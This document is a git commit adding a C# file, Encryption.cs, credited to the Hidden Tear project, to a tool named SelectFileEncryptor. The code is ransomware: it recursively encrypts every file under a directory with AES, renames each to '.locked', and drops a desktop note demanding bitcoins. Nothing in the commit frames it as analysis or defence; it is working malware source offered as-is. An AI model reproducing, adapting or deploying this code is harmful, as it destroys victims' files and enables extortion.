524a2c7ff2457159b68b84e98850d95ca39d4117
s.Lain <vvvb78@gmail.com>
2015-12-23 22:10:17 +0900

    Encryption.cs add

---
+++ SelectFileEncryptor/Encryption.cs
@@ -0,0 +1,116 @@
+﻿/*
+ * Code from Hidden_Tear_Offline(https://github.com/utkusen/hidden-tear)
+ */
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SelectFileEncryptor
+{
+    class Encryption
+    {
+        string userName = Environment.UserName;
+        string userDir = "C:\\Users\\";
+     
+        //AES encryption algorithm
+        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        {
+            byte[] encryptedBytes = null;
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+
+        //creates random password for encryption
+        public string CreatePassword(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--)
+            {
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+        //Encrypts single file
+        public void EncryptFile(string file, string password)
+        {
+
+            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+            // Hash the password with SHA256
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+            File.WriteAllBytes(file, bytesEncrypted);
+            System.IO.File.Move(file, file + ".locked");
+
+
+        }
+
+        //encrypts target directory
+        public void encryptDirectory(string location, string password)
+        {
+
+            //extensions to be encrypt
+            //var validExtensions = new[]
+            //{
+            //    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+            //};
+
+            string[] files = Directory.GetFiles(location);
+            string[] childDirectories = Directory.GetDirectories(location);
+            for (int i = 0; i < files.Length; i++)
+            {
+                string extension = Path.GetExtension(files[i]);
+                //if (validExtensions.Contains(extension))
+                //{
+                    EncryptFile(files[i], password);
+                //}
+            }
+            for (int i = 0; i < childDirectories.Length; i++)
+            {
+                encryptDirectory(childDirectories[i], password);
+            }
+        }
+
+        //creates a message for pc user
+        public void messageCreator()
+        {
+            string path = "\\Desktop\\READ_IT.txt";
+            string fullpath = userDir + userName + path;
+            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
+            System.IO.File.WriteAllLines(fullpath, lines);
+        }
+    }
+}
